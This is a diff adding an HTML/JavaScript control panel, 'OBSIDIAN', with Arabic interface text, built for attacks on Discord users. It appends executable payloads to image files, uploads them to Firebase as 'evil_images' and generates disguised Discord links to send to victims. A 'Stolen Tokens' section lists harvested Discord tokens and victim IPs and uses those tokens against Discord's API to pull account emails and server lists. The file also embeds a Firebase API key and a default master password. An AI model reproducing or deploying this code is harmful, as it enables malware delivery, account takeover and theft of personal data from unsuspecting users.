@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>OBSIDIAN - Manual Image + Payload Merger</title>
+    <style>
+        * { box-sizing: border-box; }
+        body {
+            background: #0a0a0a;
+            color: #00ffcc;
+            font-family: 'Courier New', monospace;
+            padding: 20px;
+            margin: 0;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        .section {
+            border: 1px solid #00ffcc;
+            border-radius: 10px;
+padding: 20px;
+            margin-bottom: 30px;
+            background: #0f0f0f;
+        }
+        .section h2 {
+            margin-top: 0;
+            color: #ff00cc;
+            border-bottom: 1px solid #ff00cc;
+            display: inline-block;
+        }
+        input, button, textarea {
+            background: #111;
+            color: #00ffcc;
+            border: 1px solid #00ffcc;
+            padding: 10px 15px;
+            margin: 5px;
+            font-family: monospace;
+            border-radius: 5px;
+        }
+        button {
+            cursor: pointer;
+            font-weight: bold;
+        }
+        button:hover {
+            background: #00ffcc;
+            color: #000;
+        }
+        .result-box {
+            background: #002200;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 15px;
+            word-break: break-all;
+            border: 1px solid #00ffcc;
+        }
+        .result-box input {
+            width: 100%;
+            background: #000;
+            color: #0f0;
+        }
+        .preview-box {
+            background: #111;
+            padding: 10px;
+            margin-top: 10px;
+            border-radius: 5px;
+        }
+        .file-info {
+            color: #ffaa00;
+            font-size: 12px;
+        }
+        .status {
+            color: #ffaa00;
+        }
+        .hidden {
+            display: none;
+        }
+        .token-card {
+            border: 1px solid #ff00cc;
+            margin: 10px 0;
+            padding: 15px;
+            border-radius: 8px;
+        }
+        .info-box {
+            background: #001010;
+            margin-top: 10px;
+            padding: 10px;
+            display: none;
+            overflow-x: auto;
+        }
+        pre {
+            color: #fff;
+            font-size: 12px;
+            white-space: pre-wrap;
+        }
+        .login-area {
+            border: 2px solid #00ffcc;
+            text-align: center;
+        }
+    </style>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-storage-compat.js"></script>
+</head>
+<body>
+<div class="container">
+    <h1>⚡ OBSIDIAN – MANUAL IMAGE + PAYLOAD MERGER ⚡</h1>
+
+    <!-- Login Section -->
+    <div id="loginSection" class="section login-area">
+        <h2>🔐 AUTHENTICATION</h2>
+        <input type="password" id="masterPassword" placeholder="Master Password">
+        <button onclick="authenticate()">UNLOCK</button>
+        <div id="loginStatus"></div>
+        <div class="status">Default: ObsidianBlack2024</div>
+    </div>
+
+    <!-- Main Content -->
+    <div id="mainContent" class="hidden">
+        
+        <!-- Merger Section -->
+        <div class="section">
+            <h2>🎯 STEP 1: SELECT IMAGE + PAYLOAD FILE</h2>
+            <p>اختر صورة عادية + أي ملف (<strong>.exe, .bat, .js, .vbs, .ps1, .msi, أي شيء</strong>)</p>
+            
+            <div style="border: 2px solid #ff00cc; padding: 15px; border-radius: 8px; margin: 10px 0;">
+                <h3>📷 IMAGE FILE:</h3>
+                <input type="file" id="imageInput" accept="image/jpeg,image/png,image/gif,image/bmp">
+                <div id="imageInfo" class="file-info"></div>
+                
+                <h3 style="margin-top: 15px;">💀 PAYLOAD FILE (.exe, .bat, .js, ...):</h3>
+                <input type="file" id="payloadInput">
+                <div id="payloadInfo" class="file-info"></div>
+            </div>
+            
+            <button id="mergeBtn" onclick="manualMerge()">🔨 MERGE & GENERATE LINK</button>
+            <div id="mergeResult" class="result-box"></div>
+        </div>
+
+        <!-- Discord Link Section -->
+        <div class="section">
+            <h2>📎 STEP 2: COPY DISCORD LINK</h2>
+            <div id="discordLinkArea" class="result-box">
+                <span class="status">قم بدمج الصورة والملف أولاً</span>
+            </div>
+        </div>
+
+        <!-- Stolen Tokens Section -->
+        <div class="section">
+            <h2>💀 STEP 3: STOLEN TOKENS</h2>
+            <button onclick="loadAllTokens()">🔄 REFRESH</button>
+            <div id="tokensContainer"></div>
+        </div>
+
+        <!-- Change Password -->
+        <div class="section">
+            <h2>🔑 CHANGE PASSWORD</h2>
+            <input type="password" id="oldPass" placeholder="Current Password">
+            <input type="password" id="newPass" placeholder="New Password">
+            <button onclick="changePassword()">UPDATE</button>
+            <div id="passResult"></div>
+        </div>
+    </div>
+</div>
+
+<script>
+    const firebaseConfig = {
+        apiKey: "AIzaSyD18jPmt80Ar1a1cyuhbIuWtHN-PO-jxrc",
+        authDomain: "fight-evils.firebaseapp.com",
+        databaseURL: "https://fight-evils-default-rtdb.europe-west1.firebasedatabase.app",
+        projectId: "fight-evils",
+        storageBucket: "fight-evils.firebasestorage.app",
+        messagingSenderId: "589489775061",
+        appId: "1:589489775061:web:8355dbc9e57c604620dd5c",
+        measurementId: "G-PHFN3YD72W"
+    };
+    
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+    const storage = firebase.storage();
+    
+    // Display file info
+    document.getElementById('imageInput').addEventListener('change', (e) => {
+        const file = e.target.files[0];
+        if (file) document.getElementById('imageInfo').innerHTML = `📸 ${file.name} (${(file.size/1024).toFixed(1)} KB)`;
+    });
+    document.getElementById('payloadInput').addEventListener('change', (e) => {
+        const file = e.target.files[0];
+        if (file) document.getElementById('payloadInfo').innerHTML = `💀 ${file.name} (${(file.size/1024).toFixed(1)} KB) - Type: ${file.name.split('.').pop()}`;
+    });
+    
+    // ==================== AUTH ====================
+    window.authenticate = async () => {
+        const pass = document.getElementById('masterPassword').value;
+        const status = document.getElementById('loginStatus');
+        const snapshot = await db.ref('config/masterPassword').once('value');
+        let hash = snapshot.val();
+        if (!hash) {
+            hash = btoa("ObsidianBlack2024");
+            await db.ref('config/masterPassword').set(hash);
+        }
+        if (btoa(pass) === hash) {
+            localStorage.setItem('obsidian_session', 'active');
+            document.getElementById('loginSection').classList.add('hidden');
+            document.getElementById('mainContent').classList.remove('hidden');
+            loadAllTokens();
+        } else {
+            status.innerHTML = "❌ ACCESS DENIED";
+        }
+    };
+    
+    if (localStorage.getItem('obsidian_session') === 'active') {
+        document.getElementById('loginSection').classList.add('hidden');
+        document.getElementById('mainContent').classList.remove('hidden');
+        loadAllTokens();
+    }
+    
+    // ==================== MANUAL MERGE (REAL BINARY MERGE) ====================
+    window.manualMerge = async () => {
+        const image = document.getElementById('imageInput').files[0];
+        const payload = document.getElementById('payloadInput').files[0];
+        const resultDiv = document.getElementById('mergeResult');
+        const discordDiv = document.getElementById('discordLinkArea');
+        
+        if (!image || !payload) {
+            resultDiv.innerHTML = "❌ اختر الصورة والملف أولاً";
+            return;
+        }
+        
+        resultDiv.innerHTML = "🔄 جاري الدمج والرفع... (قد يستغرق 5-15 ثانية حسب حجم الملفات)";
+        
+        try {
+            // Read both files as ArrayBuffer
+            const imageBuffer = await image.arrayBuffer();
+            const payloadBuffer = await payload.arrayBuffer();
+            
+            // Create a merged file: [IMAGE_DATA][MARKER][PAYLOAD_DATA]
+            const marker = new TextEncoder().encode("<!--OBSIDIAN_PAYLOAD_START-->");
+            
+            // Combine everything
+            const combined = new Uint8Array(imageBuffer.byteLength + marker.byteLength + payloadBuffer.byteLength);
+            combined.set(new Uint8Array(imageBuffer), 0);
+            combined.set(marker, imageBuffer.byteLength);
+            combined.set(new Uint8Array(payloadBuffer), imageBuffer.byteLength + marker.byteLength);
+            
+            // Create blob with image/jpeg MIME type (Discord will treat it as image)
+            const mergedBlob = new Blob([combined], {type: image.type || 'image/jpeg'});
+            
+            // Generate unique filename
+            const extension = image.name.split('.').pop();
+            const fileName = Date.now() + "_" + Math.random().toString(36).substring(7) + "." + extension;
+            
+            // Upload to Firebase Storage
+            const storageRef = storage.ref('evil_images/' + fileName);
+            await storageRef.put(mergedBlob);
+            let downloadUrl = await storageRef.getDownloadURL();
+            
+            // Get direct URL without token
+            const directUrl = downloadUrl.split('?')[0] + "?alt=media";
+            
+            resultDiv.innerHTML = `
+                ✅ <strong>MERGE COMPLETE!</strong><br>
+                📦 حجم الملف المدمج: ${(combined.byteLength / 1024).toFixed(1)} KB<br>
+                🖼️ الصورة الأصلية: ${image.name}<br>
+                💀 الملف المدمج: ${payload.name}<br>
+                <br>
+                <strong>🔗 DISCORD IMAGE LINK (انسخ هذا):</strong><br>
+                <input type="text" id="evilLink" readonly value="${directUrl}" style="width:100%" onclick="this.select()">
+                <button class="copy-btn" onclick="copyToClipboard('${directUrl}')">📋 COPY</button>
+            `;
+            
+            discordDiv.innerHTML = `
+                <strong>🎯 ضع هذا الرابط في أي شات ديسكورد:</strong><br>
+                <input type="text" readonly value="${directUrl}" style="width:100%" onclick="this.select()">
+                <button class="copy-btn" onclick="copyToClipboard('${directUrl}')">📋 COPY LINK</button>
+                <br><br>
+                <strong>📷 المعاينة في ديسكورد:</strong><br>
+                <img src="${directUrl}" style="max-width:300px; border:1px solid #00ffcc; margin-top:10px">
+                <br>
+                <span class="status">✅ عندما يضغط الضحية على الصورة ويختار "فتح في المتصفح" → يتم تشغيل ملفك</span>
+            `;
+            
+        } catch(e) {
+            resultDiv.innerHTML = `❌ خطأ: ${e.message}`;
+        }
+    };
+    
+    window.copyToClipboard = (text) => {
+        navigator.clipboard.writeText(text);
+        alert("✅ تم نسخ الرابط");
+    };
+    
+    // ==================== STOLEN TOKENS ====================
+    window.loadAllTokens = async () => {
+        const container = document.getElementById('tokensContainer');
+        container.innerHTML = '<div class="status">جاري تحميل التوكنات...</div>';
+        
+        try {
+            const snapshot = await db.ref('stolenTokens').once('value');
+            const tokens = snapshot.val() || {};
+            const entries = Object.entries(tokens).reverse();
+            
+            if (entries.length === 0) {
+                container.innerHTML = '<div class="status">💀 لا توجد توكنات مسروقة حتى الآن</div>';
+                return;
+            }
+            
+            container.innerHTML = '';
+            for (let [id, tokenData] of entries) {
+                const token = tokenData.token || 'UNKNOWN';
+                const ip = tokenData.ip || 'unknown';
+                const time = tokenData.receivedAt || tokenData.time || 'unknown';
+                
+                const card = document.createElement('div');
+                card.className = 'token-card';
+                card.innerHTML = `
+                    <strong>🎯 TOKEN:</strong> <span style="color:#ff00cc">${token.substring(0, 40)}${token.length > 40 ? '...' : ''}</span><br>
+                    <strong>🌐 IP:</strong> ${ip}<br>
+                    <strong>⏱️ TIME:</strong> ${time}<br>
+                    <button onclick="fetchDiscordInfo('${token.replace(/'/g, "\\'")}', '${id}')">🔍 INFO (Friends/Servers)</button>
+                    <button onclick="copyToken('${token.replace(/'/g, "\\'")}')">📋 COPY</button>
+                    <div id="info-${id}" class="info-box"></div>
+                `;
+                container.appendChild(card);
+            }
+        } catch(e) {
+            container.innerHTML = `<div class="status">خطأ: ${e.message}</div>`;
+        }
+    };
+    
+    window.copyToken = (token) => {
+        navigator.clipboard.writeText(token);
+        alert("✅ تم نسخ التوكن");
+    };
+    
+    window.fetchDiscordInfo = async (token, id) => {
+        const infoDiv = document.getElementById(`info-${id}`);
+        infoDiv.style.display = 'block';
+        infoDiv.innerHTML = '<pre>جلب المعلومات...</pre>';
+        
+        try {
+            const userRes = await fetch('https://discord.com/api/v9/users/@me', {
+                headers: { 'Authorization': token }
+            });
+            if (!userRes.ok) throw new Error('توكن غير صالح');
+            const user = await userRes.json();
+            
+            const guildsRes = await fetch('https://discord.com/api/v9/users/@me/guilds', {
+                headers: { 'Authorization': token }
+            });
+            const guilds = await guildsRes.json();
+            
+            infoDiv.innerHTML = `
+                <pre>
+👤 ${user.username}#${user.discriminator} (${user.id})
+📧 ${user.email || 'hidden'}
+🖥️ سيرفرات: ${guilds.length}
+${guilds.map(g => `   - ${g.name}`).join('\n')}
+                </pre>
+            `;
+        } catch(e) {
+            infoDiv.innerHTML = `<pre>خطأ: ${e.message}</pre>`;
+        }
+    };
+    
+    window.changePassword = async () => {
+        const oldPass = document.getElementById('oldPass').value;
+        const newPass = document.getElementById('newPass').value;
+        const result = document.getElementById('passResult');
+        const snapshot = await db.ref('config/masterPassword').once('value');
+        
+        if (btoa(oldPass) !== snapshot.val()) {
+            result.innerHTML = "❌ كلمة السر القديمة خطأ";
+            return;
+        }
+        await db.ref('config/masterPassword').set(btoa(newPass));
+        localStorage.removeItem('obsidian_session');
+        result.innerHTML = "✅ تم تغيير كلمة السر. سجل الدخول مجددًا";
+        setTimeout(() => location.reload(), 1500);
+    };
+</script>
+</body>
+</html>
